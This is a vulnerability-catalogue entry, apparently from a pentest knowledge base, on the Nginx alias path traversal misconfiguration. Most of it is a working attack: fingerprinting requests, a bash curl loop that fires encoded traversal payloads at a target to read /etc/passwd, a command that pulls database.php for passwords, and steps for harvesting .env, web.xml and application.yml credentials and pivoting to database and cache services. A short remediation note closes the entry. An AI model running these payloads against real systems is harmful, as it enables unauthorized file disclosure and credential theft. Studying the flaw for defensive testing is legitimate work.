---
id: "nginx-alias-traversal"
title: "Nginx alias path traversal (arbitrary file read/source code disclosure)"
kind: "configuration"
cve: null
related-cves: null
cve-note: "None (configuration flaw)"
severity: "high"
cvss: 7.8
severity-basis: "cvss"
severity-note: null
product: "Nginx (missing trailing slash in location alias configuration)"
versions: "Any"
ports: "80, 443"
keywords: "nginx, alias, traversal, directory, source code, configuration"
entry: "/static../  /files..;/  alias without a trailing /"
verified: false
verified-on: null
verification-evidence: null
source-url: null
vendor-advisory: null
cwe: null
patch-date: null
sources: "Compiled from public sources (configuration flaws)"
kev: null
kev-date: null
kev-source: null
epss: null
epss-percentile: null
epss-date: null
epss-source: null
enrichment-updated: null
---

## Fingerprinting

```
GET /static/../etc/passwd     → 403/200
GET /files../WEB-INF/web.xml  → 200 = positive result
```

## Prerequisites

- Configuration such as `location /static { alias /data/static/; }` (one `/` is missing).

## PoC

```bash
# 1) Common traversal patterns
for p in '/static../etc/passwd' '/static/../etc/passwd' '/files../etc/passwd' \
         '/static..%2fetc%2fpasswd' '/static/..%2f..%2fetc%2fpasswd'; do
  echo "$p → $(curl -s -o /tmp/t -w '%{http_code}' "https://target$p") $(head -c 40 /tmp/t | tr -d '\n')"
done
# Result: root:x:0:0 in the response = positive result

# 2) Read application configuration (obtain database passwords)
curl -s 'https://target/static../app/config/database.php' | head -20
```

## Exploitation Steps

1. Probe alias paths first (`/static /files /upload /img`);
2. After a positive result, read `web.xml`, `application.yml`, and `.env`;
3. Obtain DB/Redis passwords → continue with the database/cache entries;
4. Evidence: HTTP 200 + the first few lines of the file.

## Remediation and Mitigation

- Keep trailing slashes consistent: `location /static/ { alias /data/static/; }`; or use `root` instead;
- Disable script execution in upload directories.

## References

- Nginx documentation on alias semantics; public analyses of configuration errors.
